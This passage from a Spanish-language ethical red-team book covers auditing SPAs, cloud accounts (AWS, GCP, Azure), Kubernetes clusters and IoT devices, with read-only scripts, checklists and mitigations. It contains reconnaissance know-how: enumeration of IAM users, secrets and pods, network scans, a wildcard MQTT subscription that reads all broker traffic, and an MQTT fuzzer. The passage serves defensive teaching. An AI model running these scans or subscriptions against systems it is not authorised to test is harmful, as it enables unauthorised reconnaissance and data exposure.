    print("[+] Conexión exitosa con TLS.")
    print("[+] Subprotocolos aceptados:", ws.sock.headers.get("Sec-WebSocket-Protocol", "N/A"))
    print("[+] Cabecera Origin:", ws.sock.headers.get("Origin", "N/A"))
    ws.close()
except Exception as e:
    print("[!] Error durante conexión:", e)
```

**Qué hace:**

* Establece conexión y analiza el handshake.
* No transmite datos de aplicación.
* Permite validar uso de TLS, subprotocolos y control de origen.

---

## 6. Pruebas de SPA (sin ataque)

### a) Revisar almacenamiento local

* Verificar si los tokens se guardan en `localStorage` (riesgo de robo por XSS).
* Preferir `sessionStorage` o cookies seguras (`HttpOnly`, `SameSite=Strict`).

### b) Analizar llamadas fetch/XHR

* Comprobar si los endpoints requieren autenticación real.
* Revisar si el frontend asume roles o privilegios sin verificar en el backend.

### c) Validar CSP y CORS

* Revisar cabeceras:

  * `Content-Security-Policy` (bloquea scripts externos).
  * `Access-Control-Allow-Origin` (nunca usar `*`).
  * `X-Frame-Options` (evita clickjacking).

---

## 7. Ejemplo de cliente de prueba para APIs SPA

```python
#!/usr/bin/env python3
"""
spa_api_client.py — Cliente genérico para auditar endpoints SPA.
Verifica códigos de estado, autenticación y tiempos de respuesta.
"""
import requests, sys, time

if len(sys.argv) != 3:
    print("Uso: python3 spa_api_client.py <url> <jwt_token>")
    sys.exit(1)

url = sys.argv[1]
token = sys.argv[2]
headers = {"Authorization": f"Bearer {token}"}

t0 = time.time()
resp = requests.get(url, headers=headers, timeout=5)
elapsed = round(time.time() - t0, 2)

print(f"[+] Status: {resp.status_code}")
print(f"[+] Tiempo de respuesta: {elapsed}s")

if resp.status_code == 401:
    print("[!] Token no autorizado o expirado.")
if 'application/json' not in resp.headers.get('Content-Type', ''):
    print("[!] Respuesta no JSON (posible configuración insegura).")
if elapsed > 3:
    print("[!] Tiempo elevado: posible validación remota excesiva o problemas de red.")
```

---

## 8. Mitigación y buenas prácticas

| Componente     | Medida de seguridad                                                                    |
| -------------- | -------------------------------------------------------------------------------------- |
| **JWT**        | Usar algoritmos seguros (RS256, ES256), expiración corta, validación de `aud` y `iss`. |
| **Frontend**   | Almacenar tokens en cookies seguras; aplicar CSP estricta.                             |
| **Backend**    | Revalidar roles y permisos en cada solicitud.                                          |
| **WebSockets** | Usar `wss://`, autenticar cada conexión, validar origen y limitar eventos.             |
| **CORS**       | Especificar dominios concretos y métodos permitidos.                                   |
| **Logs**       | Evitar registro de tokens o credenciales.                                              |

---

## 9. Ejercicio de laboratorio seguro

1. Crea una SPA mínima (React/Vue) que consuma una API protegida con JWT.
2. Implementa el flujo de login y guarda el token en `localStorage`.
3. Usa el script `jwt_audit_extended.py` para revisar estructura y caducidad.
4. Cambia el almacenamiento a cookie `HttpOnly` y repite las pruebas.
5. Implementa un WebSocket interno y verifica su conexión con `ws_audit_client.py`.
6. Observa los cambios en seguridad cuando usas `wss://` y cabeceras `Origin`.

---

## 10. Checklist defensivo para SPAs modernas

* [ ] Usar HTTPS y WSS en todas las conexiones.
* [ ] Almacenar tokens solo en cookies seguras.
* [ ] Validar JWT en cada solicitud (firma, expiración, audiencia).
* [ ] Implementar CSP y CORS restrictivos.
* [ ] Controlar origen y subprotocolos en WebSockets.
* [ ] Evitar exponer endpoints administrativos en frontend.
* [ ] Sanitizar inputs del usuario antes de renderizar.
* [ ] No registrar tokens ni cabeceras sensibles.
* [ ] Monitorizar tiempos de respuesta y sesiones activas.
* [ ] Revisar dependencias de frontend y backend periódicamente.

---

## 11. Conclusión

Las aplicaciones modernas son potentes, pero su arquitectura distribuida y asincrónica abre una nueva superficie de exposición.
JWT y WebSockets deben tratarse como componentes críticos, no como simples utilidades.
El enfoque del Red Team ético consiste en probar sus límites en laboratorio, documentar riesgos reales y fortalecer cada capa antes de su despliegue.
Una SPA segura no depende de un framework, sino de una **cultura de validación continua y defensa por diseño**.

---

## Parte VII — Red Team en infraestructuras modernas

# Capítulo 43 — Ataques y defensa en entornos Cloud (AWS, GCP y Azure)

**Enumeración, escalada y exfiltración simulada en entornos de laboratorio ético**

---

## Objetivos

* Comprender la superficie de ataque de los entornos cloud modernos: **AWS**, **GCP** y **Azure**.
* Detectar configuraciones erróneas que permiten escalamiento de privilegios o exposición de recursos.
* Aprender a usar los SDK oficiales de cada proveedor (boto3, google-cloud, azure-sdk) para realizar **auditorías seguras y automatizadas**.
* Implementar defensas proactivas: monitoreo, segmentación, roles mínimos y detección de exfiltración.

> **Aviso ético:** este capítulo es **100 % educativo y defensivo**. Todos los ejemplos son de auditoría y detección, no de explotación. Se recomienda ejecutarlos únicamente sobre **cuentas personales o entornos de laboratorio** con políticas de prueba claramente documentadas.

---

## 1. Introducción: el nuevo perímetro es la nube

Los entornos cloud concentran servicios críticos: almacenamiento, cómputo, identidad, mensajería y automatización.
Un error de configuración o un token expuesto puede equivaler a comprometer todo un entorno corporativo.

Los ataques modernos contra la nube se enfocan en:

* Cuentas y **credenciales con permisos excesivos**.
* **Buckets públicos** o almacenamiento mal configurado.
* Roles IAM mal asignados o heredados.
* APIs administrativas accesibles desde internet.
* Movimientos laterales entre servicios cloud (pivoting multi-tenant).

---

## 2. Conceptos base de seguridad cloud

| Concepto                               | Descripción                                             | Riesgo si se ignora           |
| -------------------------------------- | ------------------------------------------------------- | ----------------------------- |
| **IAM (Identity & Access Management)** | Controla quién puede hacer qué.                         | Permisos excesivos o sin MFA. |
| **Buckets / Storage Blobs**            | Almacenan datos o backups.                              | Acceso público o sin cifrado. |
| **Roles y Policies**                   | Conjuntos de permisos aplicados a usuarios o servicios. | Escalamiento de privilegios.  |
| **API Keys y Secrets**                 | Credenciales para automatización.                       | Exfiltración o abuso.         |
| **Logs y Monitoreo**                   | Control de acciones y auditoría.                        | Invisibilidad de ataques.     |

---

## 3. Fases de evaluación defensiva

### 1. **Descubrimiento**

Auditar recursos activos, servicios y políticas.

### 2. **Evaluación de privilegios**

Identificar cuentas con permisos excesivos o huérfanas.

### 3. **Revisión de configuraciones públicas**

Buckets o endpoints accesibles sin autenticación.

### 4. **Pruebas de exfiltración simulada (ética)**

Validar que el monitoreo detecte transferencias no autorizadas.

---

## 4. Auditoría segura con SDKs oficiales

### a) AWS — usando `boto3`

```python
#!/usr/bin/env python3
"""
aws_audit.py — Auditoría defensiva básica en AWS con boto3.
Requiere credenciales válidas configuradas (aws configure).
"""
import boto3

print("[*] Enumerando usuarios y roles IAM...")

iam = boto3.client('iam')
for user in iam.list_users()['Users']:
    print(f"Usuario: {user['UserName']} - Creado: {user['CreateDate']}")
    
print("\n[*] Revisando buckets S3...")
s3 = boto3.client('s3')
for bucket in s3.list_buckets()['Buckets']:
    name = bucket['Name']
    acl = s3.get_bucket_acl(Bucket=name)
    grants = acl['Grants']
    for g in grants:
        if 'AllUsers' in str(g):
            print(f"[!] Bucket público detectado: {name}")
        else:
            print(f"Bucket privado: {name}")
```

**Qué hace:**

* Lista usuarios y buckets.
* Detecta configuraciones de acceso público.
* No modifica recursos.

---

### b) Google Cloud Platform — usando `google-cloud`

```python
#!/usr/bin/env python3
"""
gcp_audit.py — Auditoría básica de proyectos y buckets GCP.
"""
from google.cloud import storage, resource_manager

print("[*] Enumerando proyectos GCP...")
client = resource_manager.Client()
for project in client.list_projects():
    print(f"Proyecto: {project.project_id} ({project.name})")

print("\n[*] Revisando buckets públicos...")
storage_client = storage.Client()
for bucket in storage_client.list_buckets():
    iam = bucket.get_iam_policy(requested_policy_version=3)
    for binding in iam.bindings:
        if "allUsers" in binding["members"]:
            print(f"[!] Bucket público: {bucket.name}")
```

**Qué hace:**

* Lista proyectos y buckets del usuario autenticado.
* Detecta accesos públicos (`allUsers`).
* Solo lectura, sin impacto.

---

### c) Microsoft Azure — usando `azure-sdk`

```python
#!/usr/bin/env python3
"""
azure_audit.py — Revisión defensiva de blobs y roles en Azure.
"""
from azure.identity import DefaultAzureCredential
from azure.mgmt.storage import StorageManagementClient
from azure.mgmt.authorization import AuthorizationManagementClient
import os

cred = DefaultAzureCredential()
sub_id = os.environ.get("AZURE_SUBSCRIPTION_ID")
storage_client = StorageManagementClient(cred, sub_id)

print("[*] Revisando cuentas de almacenamiento...")
for account in storage_client.storage_accounts.list():
    print(f"Cuenta: {account.name} - Región: {account.location}")
    if account.allow_blob_public_access:
        print(f"[!] {account.name} permite acceso público a blobs.")

auth_client = AuthorizationManagementClient(cred, sub_id)
print("\n[*] Roles asignados globalmente:")
for role in auth_client.role_definitions.list(scope=f"/subscriptions/{sub_id}"):
    if "Owner" in role.role_name:
        print(f"[!] Rol de propietario detectado: {role.name}")
```

**Qué hace:**

* Enumera cuentas de almacenamiento y roles globales.
* Señala configuraciones riesgosas.
* No realiza cambios ni eliminaciones.

---

## 5. Escalamiento de privilegios (visión ética)

### Malas prácticas comunes detectables:

* Roles con políticas `*:*` (acceso total).
* Credenciales en código fuente (`AWS_SECRET`, `GCP_KEYFILE`).
* Service accounts con permisos heredados en múltiples proyectos.
* Usuarios sin MFA o sin rotación de claves.

### Mitigación:

* Aplicar **principio de mínimo privilegio**.
* Rotar claves cada 90 días.
* Revisar roles vinculados a servicios automatizados.
* Activar **AWS IAM Access Analyzer**, **GCP Policy Analyzer** o **Azure Defender**.

---

## 6. Simulación ética de exfiltración (detección)

> ⚠️ Solo en entornos propios: este ejemplo verifica si CloudTrail / Cloud Audit Logs / Azure Monitor registran el evento.

**Ejemplo de flujo defensivo:**

1. Crear un archivo de prueba (`sample.txt`).
2. Subirlo a un bucket con permisos públicos y luego restringirlos.
3. Revisar si el evento aparece en logs.
4. Configurar alertas automáticas de acceso anómalo.

**Objetivo:** validar que la organización **detecte transferencias no autorizadas** y no permitir accesos reales externos.

---

## 7. Indicadores en logs y detección

| Servicio | Log relevante      | Evento a monitorear                                 |
| -------- | ------------------ | --------------------------------------------------- |
| AWS      | CloudTrail         | `PutBucketAcl`, `AssumeRole`, `GetObject` anómalo.  |
| GCP      | Cloud Audit Logs   | `storage.objects.get`, `iam.setPolicy`.             |
| Azure    | Monitor / Defender | `Set-AzRoleAssignment`, `Get-AzStorageBlobContent`. |

---

## 8. Estrategias de defensa y hardening

### IAM y control de acceso

* Revisar permisos con herramientas nativas (`Access Advisor`, `IAM Analyzer`).
* Separar cuentas de servicio, administración y desarrollo.
* Implementar **MFA** obligatorio para usuarios humanos.

### Almacenamiento

* Deshabilitar ACLs públicas por defecto.
* Activar cifrado de datos en reposo y tránsito.
* Configurar versionado y bloqueo de objetos críticos.

### Monitorización

* Activar logs en todas las regiones.
* Exportar eventos a un SIEM central.
* Crear alertas por cambios en políticas o roles.

### Networking

* Restringir tráfico entrante y saliente.
* Deshabilitar IPs públicas innecesarias.
* Implementar VPC peering seguro y Zero Trust.

---

## 9. Ejercicio de laboratorio seguro

1. Crea una cuenta gratuita en AWS, GCP o Azure.
2. Despliega un bucket de almacenamiento.
3. Ejecuta los scripts de auditoría (`aws_audit.py`, `gcp_audit.py`, `azure_audit.py`).
4. Identifica configuraciones inseguras (p. ej. buckets públicos).
5. Corrige las políticas y vuelve a ejecutar el script para verificar los cambios.
6. Analiza los logs generados en el panel de auditoría del proveedor.

---

## 10. Checklist defensivo para entornos Cloud

* [ ] Habilitar CloudTrail / Audit Logs / Azure Monitor.
* [ ] Revisar roles y permisos cada trimestre.
* [ ] Aplicar MFA y rotación de claves.
* [ ] Prohibir buckets o blobs públicos.
* [ ] Activar cifrado automático.
* [ ] Implementar alertas por cambios en IAM.
* [ ] Auditar API keys en código y repositorios.
* [ ] Centralizar logs en SIEM.
* [ ] Revisar endpoints de administración expuestos.
* [ ] Ejecutar scripts de auditoría mensuales.

---

## 11. Conclusión

La nube no es inherentemente insegura: lo inseguro suele ser su **configuración**.
El Red Team ético utiliza las mismas herramientas que un atacante, pero con un propósito opuesto:
**detectar y corregir antes de que ocurra una brecha.**

Boto3, google-cloud y azure-sdk permiten realizar auditorías de permisos, políticas y visibilidad sin explotar nada.
Dominar estos SDKs convierte a un especialista en Red Team en un **defensor avanzado de infraestructuras híbridas**.

---

# Capítulo 44 — Contenedores y Kubernetes

**Discovery, aislamiento y defensa del control plane (auditoría ética y scripts de enumeración)**

---

## Objetivos

* Comprender cómo funcionan los entornos basados en contenedores y orquestadores como **Kubernetes**.
* Identificar vectores de ataque reales (sin explotarlos): *container escapes*, exposición de secretos y configuraciones inseguras.
* Aprender a auditar entornos Docker y Kubernetes con herramientas legítimas.
* Usar scripts en **Python y Bash** para enumerar pods, roles, secretos y políticas sin modificar el entorno.
* Aplicar controles de seguridad en cada capa: host, contenedor y clúster.

> **Aviso ético:** este capítulo está diseñado con fines **defensivos y educativos**. No incluye exploits ni técnicas de escape reales. Las pruebas deben realizarse únicamente en entornos personales o de laboratorio con autorización explícita.

---

## 1. Introducción: contenedores como frontera del Red Team

El auge de Docker, Podman y Kubernetes redefinió la infraestructura moderna.
Cada microservicio ahora se ejecuta en un contenedor aislado con su propio espacio de procesos, red y sistema de archivos.
Sin embargo, una mala configuración en privilegios, montajes o networking puede convertir ese aislamiento en una puerta abierta hacia el host o hacia otros pods.

---

## 2. Superficie de ataque en entornos de contenedores

| Capa                           | Riesgo típico                                 | Impacto potencial                      |
| ------------------------------ | --------------------------------------------- | -------------------------------------- |
| **Host**                       | Contenedores corriendo como root.             | Escape y ejecución en el sistema base. |
| **Contenedor**                 | Montajes de `/var/run/docker.sock` o `/root`. | Control total del demonio Docker.      |
| **Red**                        | Pods con puertos expuestos externamente.      | Pivoting lateral o exfiltración.       |
| **Control Plane (Kubernetes)** | API Server sin autenticación o RBAC débil.    | Compromiso total del clúster.          |
| **Secretos**                   | Variables de entorno o ConfigMaps sin cifrar. | Robo de credenciales y llaves API.     |

---

## 3. Auditoría segura de contenedores Docker

### Comprobación de configuración local

```bash
#!/bin/bash
# docker_audit.sh — Auditoría rápida y no intrusiva del entorno Docker
echo "[*] Versiones y privilegios"
docker version --format '{{.Server.Version}}'

echo "[*] Contenedores en ejecución:"
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}"

echo "[*] Verificando montajes peligrosos..."
docker inspect $(docker ps -q) | grep -E 'docker.sock|/root|/etc/shadow' && echo "[!] Montaje sensible detectado"
```

**Objetivo:** identificar contenedores con montajes peligrosos o con acceso al socket Docker (lo que rompe el aislamiento).
Este script **no ejecuta ni modifica contenedores**.

---

## 4. Introducción a Kubernetes y su modelo de seguridad

**Componentes clave del Control Plane:**

* **API Server:** interfaz principal para administrar el clúster.
* **etcd:** base de datos que almacena configuración y secretos.
* **Controller Manager & Scheduler:** gestionan pods y estados.
* **kubelet:** agente local en cada nodo.

### Principios de seguridad

1. **RBAC (Role-Based Access Control):** define quién puede hacer qué.
2. **Namespaces:** separación lógica de recursos.
3. **Pod Security Policies / Admission Controllers:** restringen capacidades.
4. **ServiceAccounts:** identidades para pods y servicios.

---

## 5. Enumeración ética en Kubernetes (kubectl / API)

### a) Descubrimiento de recursos

```bash
# Enumerar namespaces y pods
kubectl get namespaces
kubectl get pods -A -o wide

# Revisar servicios expuestos
kubectl get svc -A
```

### b) Listar secretos (solo lectura, sin extraer datos sensibles)

```bash
# Mostrar nombres de secretos sin contenido
kubectl get secrets -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type
```

### c) Revisar ServiceAccounts y roles

```bash
kubectl get serviceaccounts -A
kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A
```

Estos comandos permiten verificar configuraciones sin revelar secretos ni modificar nada.

---

## 6. Script defensivo en Python — Enumeración segura con la API

```python
#!/usr/bin/env python3
"""
kube_audit.py — Auditoría pasiva del clúster Kubernetes.
Usa las credenciales actuales de kubeconfig.
"""
from kubernetes import client, config

print("[*] Cargando configuración local...")
config.load_kube_config()

v1 = client.CoreV1Api()
print("[*] Enumerando namespaces y pods...")
for ns in v1.list_namespace().items:
    print(f"\nNamespace: {ns.metadata.name}")
    pods = v1.list_namespaced_pod(ns.metadata.name)
    for pod in pods.items:
        print(f"  Pod: {pod.metadata.name} - Imagen: {pod.spec.containers[0].image}")
        for vol in (pod.spec.volumes or []):
            if vol.host_path:
                print(f"   [!] Montaje directo al host: {vol.host_path.path}")

print("\n[*] Listando secretos disponibles (solo nombres):")
for ns in v1.list_namespace().items:
    secrets = v1.list_namespaced_secret(ns.metadata.name)
    for s in secrets.items:
        print(f"  {ns.metadata.name}/{s.metadata.name}")
```

**Qué hace:**

* Usa el SDK oficial de Kubernetes (`kubernetes-client`).
* Enumera namespaces, pods, imágenes y montajes al host.
* Muestra nombres de secretos, **sin exponer contenido ni claves**.
* No modifica el clúster.

---

## 7. Indicadores de riesgo en Kubernetes

| Tipo de riesgo              | Ejemplo                                     | Mitigación                                  |
| --------------------------- | ------------------------------------------- | ------------------------------------------- |
| **Privilegios excesivos**   | Pods con `securityContext.privileged=true`. | Definir políticas PodSecurity o PSP.        |
| **Montajes hostPath**       | `/var/run/docker.sock`, `/etc`.             | Evitar montajes directos al host.           |
| **ServiceAccount expuesto** | Tokens montados automáticamente.            | Usar `automountServiceAccountToken: false`. |
| **API Server expuesto**     | `kubectl proxy` sin autenticación.          | Aplicar RBAC y mTLS.                        |
| **Secretos en texto plano** | Variables o ConfigMaps sin cifrado.         | Habilitar `EncryptionConfiguration`.        |

---

## 8. Hardening y defensa del clúster

### a) Políticas de seguridad

* Implementar **NetworkPolicies** para limitar el tráfico entre pods.
* Definir **PodSecurity Standards**: `restricted`, `baseline`, `privileged`.
* Aplicar **OPA Gatekeeper** o **Kyverno** para validar configuraciones.

### b) Control Plane

* Deshabilitar acceso anónimo (`--anonymous-auth=false`).
* Activar auditoría (`--audit-log-path`).
* Configurar certificados TLS propios.

### c) Nodo y contenedor

* Ejecutar contenedores sin root (`USER app`).
* Limitar capacidades (`capDrop`).
* Usar imágenes firmadas y escaneadas.
* Evitar ejecutar Docker dentro de Docker (dind).

---

## 9. Auditoría de secretos y configuraciones (defensiva)

### Python — inspección de secretos cifrados

```python
#!/usr/bin/env python3
"""
check_secrets_encrypted.py — Verifica si los secretos están cifrados en etcd.
Solo lectura mediante Kubernetes API.
"""
from kubernetes import client, config

config.load_kube_config()
v1 = client.CoreV1Api()

print("[*] Verificando secretos con tipo genérico...")
for ns in v1.list_namespace().items:
    secrets = v1.list_namespaced_secret(ns.metadata.name)
    for s in secrets.items:
        if s.type == "Opaque":
            data_len = sum(len(v) for v in (s.data or {}).values())
            if data_len > 0:
                print(f"[!] {ns.metadata.name}/{s.metadata.name} contiene datos visibles (no cifrados)")
```

**Propósito:** identificar secretos sin cifrado de campo o sin uso de `EncryptionConfiguration`.

---

## 10. Ejercicio de laboratorio seguro

1. Instala **Minikube** o **kind** (Kubernetes local).
2. Crea un namespace de pruebas y varios pods.
3. Monta un directorio de host (`/tmp/audit`) en un pod — observa cómo el script lo detecta.
4. Crea un secreto en texto plano (`kubectl create secret generic demo --from-literal=pass=1234`).
5. Ejecuta `check_secrets_encrypted.py` para verificar su detección.
6. Activa cifrado en etcd (`EncryptionConfiguration.yaml`) y repite la auditoría: el secreto ya no aparecerá como expuesto.

---

## 11. Checklist de seguridad para Kubernetes y contenedores

* [ ] No ejecutar contenedores como root.
* [ ] Evitar montajes `hostPath`.
* [ ] Cifrar secretos con KMS o `EncryptionConfiguration`.
* [ ] Aplicar RBAC estricto.
* [ ] Restringir acceso al API Server.
* [ ] Usar imágenes verificadas (firma o digest).
* [ ] Activar auditoría de eventos (`audit-log-path`).
* [ ] Implementar `NetworkPolicies` entre namespaces.
* [ ] Monitorear pods con herramientas (Falco, KubeArmor).
* [ ] Rotar tokens y credenciales periódicamente.

---

## 12. Conclusión

Kubernetes combina potencia y complejidad: si no se configura con rigor, puede convertir cada contenedor en un punto de entrada.
La seguridad en entornos cloud-native exige pensar en **aislamiento, visibilidad y control de privilegios**.
El Red Teamer ético no busca escapar del contenedor, sino **asegurarse de que nadie más pueda hacerlo**.

Auditar pods, roles y secretos con SDKs legítimos (como `kubernetes-client`) proporciona una visión clara del estado del clúster sin alterar su funcionamiento.
El futuro de la seguridad ofensiva está en la **observación responsable**: detectar debilidades antes de que se conviertan en puertas abiertas.

---

# Capítulo 45 — IoT y Dispositivos de Red

**Firmware, interfaces web y protocolos (MQTT, UPnP) — Auditoría y automatización de fuzzing ético**

---

## Objetivos

* Comprender la arquitectura típica de los dispositivos IoT y sus riesgos de seguridad.
* Analizar vectores comunes de ataque en firmware, interfaces web embebidas y protocolos de comunicación.
* Implementar metodologías éticas para auditar dispositivos sin dañar el hardware ni violar licencias.
* Automatizar pruebas de comunicación y fuzzing con **Python** para detectar fallos de validación.
* Aprender medidas de mitigación y buenas prácticas en entornos conectados.

> **Aviso ético:** los ejemplos presentados son **exclusivamente educativos**. El análisis de firmware o fuzzing debe realizarse **únicamente en dispositivos propios, virtualizados o en entornos de laboratorio**, respetando licencias y leyes de propiedad intelectual.

---

## 1. Introducción: el ecosistema IoT y su superficie de ataque

El Internet de las Cosas (IoT) conecta cámaras, routers, sensores, electrodomésticos, vehículos y sistemas industriales.
Cada dispositivo es un nodo en la red y, por tanto, una potencial puerta de entrada si no está asegurado.

Los errores más frecuentes incluyen:

* Interfaces web sin autenticación robusta.
* Firmwares sin verificación de firma o cifrado.
* Protocolos como **MQTT**, **UPnP** o **Telnet** abiertos al exterior.
* Contraseñas predeterminadas.
* Actualizaciones inseguras o inactivas.

La combinación de limitaciones de hardware y poca supervisión convierte al IoT en un terreno fértil para los atacantes… y en un desafío esencial para el Red Team moderno.

---

## 2. Anatomía de un dispositivo IoT

| Componente                 | Función                                 | Riesgo típico                                                 |
| -------------------------- | --------------------------------------- | ------------------------------------------------------------- |
| **Firmware**               | Sistema operativo embebido.             | Exposición de claves, backdoors, credenciales en texto plano. |
| **Interfaz web**           | Configuración y administración.         | Falta de autenticación o sanitización de entradas.            |
| **Protocolos IoT**         | Comunicación entre dispositivos y nube. | Inyección, replay, DoS, fuga de datos.                        |
| **Red local**              | Interacción con routers y gateways.     | Exposición por UPnP o broadcast.                              |
| **Gestión remota (Cloud)** | Sincronización y actualizaciones.       | APIs sin autenticación fuerte.                                |

---

## 3. Análisis de firmware (nivel pasivo)

La auditoría de firmware se realiza sobre imágenes descargadas desde el sitio oficial del fabricante.
**Jamás** se deben manipular o redistribuir binarios de terceros.

### Herramientas legítimas en Kali Linux:

* **binwalk:** extracción de sistemas de archivos embebidos.
* **strings / hexdump:** análisis de texto y metadatos.
* **Firmware Mod Kit:** reconstrucción y análisis estructurado.
* **Ghidra / Radare2:** ingeniería inversa educativa.

### Flujo de análisis:

```bash
binwalk -e firmware.bin
cd _firmware.bin.extracted
grep -R "password" .
grep -R "http" .
```

**Objetivo:** identificar configuraciones o archivos sensibles **sin ejecutar** el firmware.

---

## 4. Interfaces web embebidas

Muchos routers y cámaras ofrecen paneles de control HTTP o HTTPS internos, generalmente en los puertos 80/443.
Errores típicos:

* Formularios sin validación de sesión.
* Contraseñas hardcodeadas en JavaScript.
* APIs internas sin control de origen (CORS).
* Exposición de endpoints de administración (`/cgi-bin/admin`, `/setup`).

### Auditoría ética:

```bash
nmap -p80,443 --script http-title,http-headers 192.168.0.0/24
```

* Identificar qué dispositivos exponen interfaces web.
* Analizar banners y cabeceras.
* No enviar credenciales ni peticiones intrusivas.

---

## 5. Protocolos IoT más comunes y sus riesgos

| Protocolo      | Función                                       | Riesgo                                                  |
| -------------- | --------------------------------------------- | ------------------------------------------------------- |
| **MQTT**       | Comunicación publish/subscribe ligera.        | Mensajes sin autenticación, brokers abiertos.           |
| **UPnP**       | Descubrimiento automático de dispositivos.    | Exposición de servicios internos al exterior.           |
| **CoAP**       | Protocolo liviano sobre UDP.                  | Sin cifrado ni autenticación.                           |
| **Telnet/FTP** | Administración antigua.                       | Contraseñas predeterminadas.                            |
| **SSH/HTTPS**  | Acceso seguro (si configurado correctamente). | Mitigación efectiva si se usa con certificados válidos. |

---

## 6. Automatización de discovery en red local

### Script en Bash (detección rápida)

```bash
#!/bin/bash
# iot_discovery.sh — Descubre dispositivos IoT en red local
echo "[*] Escaneando red local para identificar dispositivos IoT..."
nmap -sP 192.168.0.0/24 | grep "Nmap scan report" | awk '{print $5}'
echo "[*] Analizando puertos comunes (80, 1883, 1900)..."
nmap -p80,1883,1900 --open 192.168.0.0/24
```

Este script detecta dispositivos activos y protocolos IoT como MQTT o UPnP.
No explota servicios; su fin es **mapear exposición y alcance**.

---

## 7. Auditoría pasiva de MQTT (Python)

```python
#!/usr/bin/env python3
"""
mqtt_audit.py — Verifica configuraciones básicas de brokers MQTT.
Uso ético: solo en entornos propios o con autorización.
"""
import paho.mqtt.client as mqtt

BROKER = "192.168.0.10"
PORT = 1883

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[+] Conexión exitosa al broker MQTT.")
        client.subscribe("#", qos=0)
        print("[*] Suscripción a todos los tópicos para detección pasiva.")
    else:
        print("[!] Fallo de conexión, código:", rc)

def on_message(client, userdata, msg):
    print(f"  [{msg.topic}] {msg.payload.decode(errors='ignore')[:80]}")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

try:
    client.connect(BROKER, PORT, 60)
    client.loop_forever()
except Exception as e:
    print("[!] Error al conectar:", e)
```

**Qué hace:**

* Se conecta al broker MQTT local (sin publicar nada).
* Detecta si permite suscripciones anónimas.
* Registra tópicos y mensajes observados.

---

## 8. UPnP y exposición de servicios

El protocolo **Universal Plug and Play (UPnP)** permite a los dispositivos anunciar sus servicios en red.
En muchos casos, los routers lo dejan activo por defecto.

### Script defensivo con Python

```python
#!/usr/bin/env python3
"""
upnp_scan.py — Detección de dispositivos UPnP activos.
No realiza explotación, solo descubrimiento.
"""
import socket

msg = '\r\n'.join([
    'M-SEARCH * HTTP/1.1',
    'HOST:239.255.255.250:1900',
    'MAN:"ssdp:discover"',
    'MX:2',
    'ST:upnp:rootdevice', '', '']).encode('utf-8')

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(3)
s.sendto(msg, ('239.255.255.250', 1900))

try:
    while True:
        data, addr = s.recvfrom(1024)
        print(f"[+] Dispositivo UPnP desde {addr[0]}:")
        print(data.decode(errors='ignore').split('\r\n')[0:3])
except socket.timeout:
    print("[*] Escaneo finalizado.")
```

**Propósito:** descubrir dispositivos que respondan al broadcast SSDP.
Si hay muchos resultados, el entorno tiene **UPnP activo** y requiere endurecimiento.

---

## 9. Fuzzing ético y automatización

El **fuzzing** consiste en enviar entradas aleatorias o estructuradas para comprobar si un sistema responde de forma insegura o inesperada.
En IoT, se aplica a interfaces web o protocolos ligeros (MQTT, CoAP).

### Python — generador de pruebas controladas

```python
#!/usr/bin/env python3
"""
mqtt_fuzzer.py — Fuzzing ético básico para MQTT.
No explota ni daña; prueba validación de tamaño y formato.
"""
import paho.mqtt.publish as publish
import random, string, time

BROKER = "192.168.0.10"
TOPIC = "iot/test"

def random_payload(size):
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))

for i in range(10):
    msg = random_payload(random.randint(10, 200))
    try:
        publish.single(TOPIC, msg, hostname=BROKER)
        print(f"[{i}] Mensaje enviado ({len(msg)} bytes).")
        time.sleep(1)
    except Exception as e:
        print("[!] Error al publicar:", e)
        break
```

**Qué hace:**

* Envía mensajes aleatorios de tamaño controlado a un tópico de prueba.
* Sirve para validar **tolerancia y manejo de errores** del broker MQTT.
* No intenta causar denegación de servicio ni manipular datos.

---

## 10. Estrategias de defensa para IoT y dispositivos embebidos

| Área                 | Recomendación                                                               |
| -------------------- | --------------------------------------------------------------------------- |
| **Firmware**         | Verificar firmas digitales y hashes SHA256 antes de instalar.               |
| **Interfaces web**   | Usar HTTPS, autenticar usuarios y deshabilitar configuraciones por defecto. |
| **MQTT**             | Requerir autenticación y TLS (`port 8883`).                                 |
| **UPnP**             | Deshabilitar si no es estrictamente necesario.                              |
| **Red**              | Segmentar IoT en VLANs aisladas.                                            |
| **Logs y monitoreo** | Registrar eventos de conexión y mensajes anómalos.                          |
| **Actualizaciones**  | Automatizar actualizaciones seguras y firmadas.                             |

---

## 11. Ejercicio práctico de laboratorio

1. Crea un entorno virtual con **Mosquitto (broker MQTT)** y un **dispositivo simulado** en Python.
2. Ejecuta `mqtt_audit.py` para observar los tópicos expuestos.
3. Usa `mqtt_fuzzer.py` y analiza cómo el broker maneja entradas inusuales.
4. Activa autenticación TLS en el broker y repite las pruebas.
5. Ejecuta `upnp_scan.py` y verifica si tu router o dispositivos domésticos responden al broadcast SSDP.
6. Deshabilita UPnP en el router y confirma la ausencia de respuestas.

---

## 12. Checklist de seguridad IoT

* [ ] Firmware verificado y actualizado.
* [ ] Autenticación y cifrado en interfaces.
* [ ] Deshabilitar protocolos inseguros (Telnet, FTP).
* [ ] MQTT con TLS y usuarios únicos.
* [ ] UPnP desactivado en red doméstica o corporativa.
* [ ] Segmentación de red para IoT.
* [ ] Monitoreo de tráfico con IDS/IPS.
* [ ] Pruebas de fuzzing controlado periódicas.
* [ ] Backups de configuración segura.
* [ ] Documentación de dispositivos conectados.

---

## 13. Conclusión

El ecosistema IoT representa la frontera más frágil del ciberespacio.
Un solo dispositivo vulnerable puede comprometer toda una red doméstica o industrial.
La labor del Red Team ético es **descubrir y reportar configuraciones inseguras antes de que otros las aprovechen**.

El análisis de firmware, la revisión de protocolos y el fuzzing controlado permiten detectar fallas de diseño sin dañar los sistemas.
El verdadero poder está en la prevención: cifrar, segmentar y monitorear.
Con disciplina y herramientas legítimas, es posible construir un IoT resiliente y confiable.

---

# Capítulo 46 — Wireless & Bluetooth Offensive

**Análisis ético de redes Wi-Fi y BLE — Captura, autenticación y spoofing controlado**

---

## Objetivos

